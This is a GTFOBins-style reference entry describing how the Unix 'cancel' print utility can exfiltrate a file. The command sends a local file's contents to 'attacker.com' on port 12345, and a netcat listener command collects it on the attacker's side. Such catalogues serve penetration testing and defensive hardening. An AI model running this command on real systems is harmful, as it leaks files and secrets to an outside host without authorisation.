# GTFOBin: cancel

## File upload

It can exfiltrate files on the network.

Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
```